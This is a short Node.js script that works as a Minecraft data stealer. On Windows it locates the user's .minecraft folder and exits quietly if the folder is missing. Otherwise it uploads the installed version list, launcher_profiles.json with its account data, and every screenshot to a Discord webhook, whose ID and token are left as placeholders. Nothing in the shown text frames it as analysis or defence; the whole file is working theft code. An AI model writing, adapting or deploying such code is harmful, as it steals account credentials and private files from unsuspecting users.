//Dependencies
const Discord = require("discord.js")
const Os = require("os")
const Fs = require("fs")

//Variables
const Webhook = new Discord.WebhookClient("webhookid", "webhooktoken")

//Main
if(!Fs.existsSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Roaming\\.minecraft`) || !Fs.existsSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Roaming\\.minecraft\\launcher_profiles.json`) || !Fs.existsSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Roaming\\.minecraft\\screenshots`) || !Fs.existsSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Roaming\\.minecraft\\versions`)){
    process.exit()
}

const Versions = Fs.readdirSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Roaming\\.minecraft\\versions`, "utf8")
const Temp_Screenshots = Fs.readdirSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Roaming\\.minecraft\\screenshots`, "utf8")
var Screenshots = []

if(Temp_Screenshots.length != 0){
    for( i in Temp_Screenshots ){
        Screenshots.push(`C:\\Users\\${Os.userInfo().username}\\AppData\\Roaming\\.minecraft\\screenshots\\${Temp_Screenshots[i]}`)
    }
}

Webhook.send(`${Os.userInfo().username} Minecraft versions: ${Versions}`).then(()=>{
    Webhook.send(`${Os.userInfo().username} Minecraft data`, { files: [`C:\\Users\\${Os.userInfo().username}\\AppData\\Roaming\\.minecraft\\launcher_profiles.json`] }).then(()=>{
        Webhook.send(`${Os.userInfo().username} Minecraft screenshots`, { files: Screenshots })
    }).catch(()=>{
        Webhook.send(`${Os.userInfo().username} Minecraft screenshots`, { files: Screenshots })
    })
}).catch(()=>{
    Webhook.send(`${Os.userInfo().username} Minecraft data`, { files: [`C:\\Users\\${Os.userInfo().username}\\AppData\\Roaming\\.minecraft\\launcher_profiles.json`] }).then(()=>{
        Webhook.send(`${Os.userInfo().username} Minecraft screenshots`, { files: Screenshots })
    }).catch(()=>{
        Webhook.send(`${Os.userInfo().username} Minecraft screenshots`, { files: Screenshots })
    })
})
